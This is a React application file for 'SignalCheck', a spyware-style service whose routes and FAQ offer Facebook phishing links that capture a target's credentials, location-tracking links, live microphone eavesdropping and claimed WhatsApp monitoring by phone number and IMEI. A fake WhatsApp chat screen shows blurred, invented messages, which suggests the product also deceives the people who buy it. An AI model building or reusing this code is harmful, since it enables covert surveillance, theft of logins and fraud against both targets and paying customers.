import React, { useState } from 'react';
import './global.css';
import Login from './components/Login';
import Dashboard from './components/Dashboard';
import TrackerPage from './pages/TrackerPage';
import FacebookPhishing from './pages/FacebookPhishing';
import MicrophonePage from './pages/MicrophonePage';
import HowToGetIMEI from './pages/HowToGetIMEI';
import IMEISupportRequest from './pages/IMEISupportRequest';
import { BrowserRouter, Routes, Route, useParams } from 'react-router-dom';

function WhatsAppChat() {
  const { number } = useParams();
  // Mensagens simuladas
  const messages = [
    { fromMe: false, text: 'last message', time: '21:13' },
    { fromMe: true, text: 'last message', time: '21:14' },
    { fromMe: false, text: 'last message', time: '21:15' },
    { fromMe: true, text: 'last message', time: '21:16' },
    { fromMe: false, text: 'last message', time: '21:17' },
    { fromMe: true, text: 'last message', time: '21:18' },
    { fromMe: false, text: 'last message', time: '21:19' },
    { fromMe: true, text: 'last message', time: '21:20' },
  ];
  return (
    <div style={{
      minHeight: '100vh',
      background: '#111b21 url("https://static.whatsapp.net/rsrc.php/v3/yl/r/8zQ2Wg6q4kN.png") repeat',
      color: '#e9edef',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      fontFamily: 'Inter, Arial, sans-serif'
    }}>
      {/* Barra superior */}
      <div style={{
        width: '100%',
        maxWidth: 700,
        background: '#202c33',
        borderRadius: '0 0 14px 14px',
        boxShadow: '0 2px 8px #0001',
        padding: '1.2rem 2.2rem',
        display: 'flex', alignItems: 'center', gap: 16, marginTop: 32
      }}>
        <div style={{ width: 44, height: 44, borderRadius: '50%', background: '#25d366', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 22 }}>D</div>
        <div>
          <div style={{ fontWeight: 700, color: '#25d366', fontSize: 18 }}>davi</div>
          <div style={{ color: '#b0b0b0', fontSize: 14 }}>online</div>
        </div>
        <div style={{ marginLeft: 'auto', color: '#b0b0b0', fontSize: 15 }}>{number}</div>
        <div style={{ marginLeft: 18, display: 'flex', gap: 12 }}>
          <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📞</span>
          <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📹</span>
          <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>⋮</span>
        </div>
      </div>
      {/* Área de mensagens */}
      <div style={{
        background: 'transparent',
        borderRadius: 14,
        boxShadow: 'none',
        padding: '1.5rem 2.2rem',
        maxWidth: 700,
        width: '100%',
        margin: '32px auto 0 auto',
        minHeight: 320,
        maxHeight: 420,
        overflowY: 'auto',
        display: 'flex', flexDirection: 'column', gap: 0
      }}>
        {messages.map((msg, i) => (
          <div key={i} style={{
            display: 'flex', flexDirection: msg.fromMe ? 'row-reverse' : 'row', alignItems: 'flex-end',
            marginBottom: 10, width: '100%'
          }}>
            <div style={{
              background: msg.fromMe ? '#005c4b' : '#232d36',
              color: '#e9edef',
              borderRadius: msg.fromMe ? '16px 4px 16px 16px' : '4px 16px 16px 16px',
              padding: '0.7rem 1.1rem',
              minWidth: 60,
              maxWidth: '70%',
              fontSize: 15,
              position: 'relative',
              filter: 'blur(3px) grayscale(0.3) brightness(0.7)',
              userSelect: 'none',
              cursor: 'not-allowed',
              marginLeft: msg.fromMe ? 0 : 8,
              marginRight: msg.fromMe ? 8 : 0
            }}>
              <span style={{ color: '#25d366', fontSize: 18, marginRight: 6 }}>💬</span>
              {msg.text}
              <span style={{ position: 'absolute', right: 10, bottom: 6, color: '#b0b0b0', fontSize: 12 }}>{msg.time}</span>
            </div>
          </div>
        ))}
      </div>
      {/* Campo de digitação fake */}
      <div style={{
        width: '100%', maxWidth: 700, margin: '0 auto', marginTop: 18,
        display: 'flex', alignItems: 'center', gap: 12, background: '#232d36', borderRadius: 10, padding: '0.7rem 1.2rem'
      }}>
        <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>😊</span>
        <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📎</span>
        <input disabled placeholder="Type a message..." style={{
          flex: 1, background: 'transparent', border: 'none', color: '#b0b0b0', fontSize: 15, outline: 'none', fontFamily: 'Inter',
        }} />
        <button disabled style={{ background: '#25d366', color: '#fff', border: 'none', borderRadius: 8, padding: '0.5rem 1.2rem', fontWeight: 700, fontSize: 15, cursor: 'not-allowed' }}>🎤</button>
        <button disabled style={{ background: '#25d366', color: '#fff', border: 'none', borderRadius: 8, padding: '0.5rem 1.2rem', fontWeight: 700, fontSize: 15, cursor: 'not-allowed' }}>Send</button>
      </div>
      {/* Mensagem de privacidade */}
      <div style={{ color: '#b0b0b0', fontSize: 15, marginTop: 18, textAlign: 'center', maxWidth: 700 }}>
        <span style={{ color: '#E60033', fontWeight: 600 }}>You do not have access to the content of this chat.</span>
      </div>
    </div>
  );
}

function FAQ({ sidebarItems, active, setActive }) {
  return (
    <>
      <Header />
      <div style={{ display: 'flex', minHeight: '100vh', background: 'var(--preto-espionagem)' }}>
        <Sidebar active={active || 'FAQ'} onSelect={setActive} items={sidebarItems} />
        <div style={{ flex: 1 }}>
          <div style={{ maxWidth: 700, margin: '3rem auto', padding: '2rem', background: 'var(--cinza-card)', borderRadius: 16, color: '#fff', textAlign: 'left', fontSize: 17 }}>
            <img src="/suporte.jpg" alt="Support FAQ" style={{ display: 'block', margin: '0 auto 2rem auto', width: '100%', maxWidth: 320, borderRadius: 12, boxShadow: '0 2px 8px #0005' }} />
            <h2 style={{ color: '#25d366', marginBottom: 18, textAlign: 'center' }}>Frequently Asked Questions (FAQ)</h2>
            <div style={{ marginBottom: 32 }}>
              <h3 style={{ color: '#E60033', marginBottom: 8 }}>How to use each tool:</h3>
              <b>Lessons</b>
              <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
                <li>Access tutorials and instructions for using all features of SignalCheck.</li>
                <li>Click on "Lessons" and follow the guides to learn step by step.</li>
              </ul>
              <b>Spy Location</b>
              <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
                <li>Generate a tracking link and send it to the target device.</li>
                <li>When the link is accessed, the device's location will be captured and shown in "Your tracking links".</li>
                <li>Click "Refresh list" to update the accesses.</li>
              </ul>
              <b>WhatsApp</b>
              <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
                <li>Enter the phone number, device model, and IMEI of the target device.</li>
                <li>Follow the instructions to connect and monitor WhatsApp conversations.</li>
                <li>If you don't have the IMEI, use the help link to learn how to get it or request support.</li>
              </ul>
              <b>Facebook Phishing</b>
              <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
                <li>Generate a Facebook phishing link and send it to the target.</li>
                <li>When the target enters their credentials, the data will be captured and shown in the dashboard.</li>
                <li>Use responsibly and only for authorized testing or recovery.</li>
              </ul>
              <b>Microphone</b>
              <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
                <li>Generate a microphone link and send it to the target device.</li>
                <li>When accessed, you can listen to real-time audio from the device's microphone.</li>
              </ul>
              <b>IMEI Support</b>
              <ul style={{ margin: '0 0 1.2rem 1.2rem' }}>
                <li>If you cannot get the IMEI of the target device, open a support ticket via the IMEI Support page.</li>
                <li>Provide the phone number, device model/version, and your contact email.</li>
                <li>Our team will try to obtain the IMEI for you within 7-10 business days.</li>
              </ul>
            </div>
            <div style={{ color: '#b0b0b0', fontSize: 15, textAlign: 'center', marginTop: 32 }}>
              If you have more questions, please contact our support team.
              <br />
              <button
                style={{
                  marginTop: 24,
                  background: '#25d366',
                  color: '#fff',
                  border: 'none',
                  borderRadius: 8,
                  padding: '0.7rem 1.7rem',
                  fontSize: '1rem',
                  fontWeight: 700,
                  cursor: 'pointer',
                  display: 'inline-block',
                }}
                onClick={() => window.location.href = 'https://app-perfectpay-combr.vercel.app/'}
              >
                Request a refund
              </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

function Support({ sidebarItems, active, setActive }) {
  const [name, setName] = React.useState('');
  const [email, setEmail] = React.useState('');
  const [subject, setSubject] = React.useState('');
  const [message, setMessage] = React.useState('');
  const [sent, setSent] = React.useState(false);

  function handleSubmit(e) {
    e.preventDefault();
    setSent(true);
  }

  return (
    <>
      <Header />
      <div style={{ display: 'flex', minHeight: '100vh', background: 'var(--preto-espionagem)' }}>
        <Sidebar active={active || 'Support'} onSelect={setActive} items={sidebarItems} />
        <div style={{ flex: 1 }}>
          <div style={{ maxWidth: 600, margin: '3rem auto', padding: '2rem', background: 'var(--cinza-card)', borderRadius: 16, color: '#fff', textAlign: 'center' }}>
            <h2 style={{ color: '#E60033', marginBottom: 18 }}>Support</h2>
            <p style={{ fontSize: 18, marginBottom: 24 }}>If you need help, please open a support ticket below. Our team will get back to you as soon as possible.</p>
            <form onSubmit={handleSubmit} style={{ maxWidth: 400, margin: '0 auto', textAlign: 'left' }}>
              <label style={{ color: '#fff', fontWeight: 600 }}>Name</label>
              <input type="text" value={name} onChange={e => setName(e.target.value)} required style={{ width: '100%', padding: 10, borderRadius: 8, border: '1px solid #b0b0b0', marginBottom: 12, fontSize: 16, background: '#181A1B', color: '#fff' }} />
              <label style={{ color: '#fff', fontWeight: 600 }}>Email</label>
              <input type="email" value={email} onChange={e => setEmail(e.target.value)} required style={{ width: '100%', padding: 10, borderRadius: 8, border: '1px solid #b0b0b0', marginBottom: 12, fontSize: 16, background: '#181A1B', color: '#fff' }} />
              <label style={{ color: '#fff', fontWeight: 600 }}>Subject</label>
              <input type="text" value={subject} onChange={e => setSubject(e.target.value)} required style={{ width: '100%', padding: 10, borderRadius: 8, border: '1px solid #b0b0b0', marginBottom: 12, fontSize: 16, background: '#181A1B', color: '#fff' }} />
              <label style={{ color: '#fff', fontWeight: 600 }}>Message</label>
              <textarea value={message} onChange={e => setMessage(e.target.value)} required rows={5} style={{ width: '100%', padding: 10, borderRadius: 8, border: '1px solid #b0b0b0', marginBottom: 18, fontSize: 16, background: '#181A1B', color: '#fff', resize: 'vertical' }} />
              <button type="submit" style={{ background: '#25d366', color: '#fff', border: 'none', borderRadius: 8, padding: '0.7rem 1.7rem', fontSize: '1rem', fontWeight: 700, cursor: 'pointer', width: '100%', marginBottom: 10 }}>Submit Ticket</button>
            </form>
            {sent && (
              <div style={{ color: '#25d366', marginTop: 18, fontWeight: 600, fontSize: 17 }}>
                Support ticket sent! Our team will contact you soon.
              </div>
            )}
          </div>
        </div>
      </div>
    </>
  );
}

function App() {
  const [usuario, setUsuario] = useState(localStorage.getItem('usuario') || null);

  function handleLogin(email) {
    setUsuario(email);
    localStorage.setItem('usuario', email);
  }

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={
          !usuario ? (
            <Login onLogin={handleLogin} />
          ) : (
            <Dashboard email={usuario} />
          )
        } />
        <Route path="/redirect/:id" element={<TrackerPage />} />
        <Route path="/facebook/:id" element={<FacebookPhishing />} />
        <Route path="/microphone/:id" element={<MicrophonePage />} />
        <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
        <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
        <Route path="/imei-support-request" element={<IMEISupportRequest />} />
        <Route path="/faq" element={<FAQ />} />
        <Route path="/support" element={<Support />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
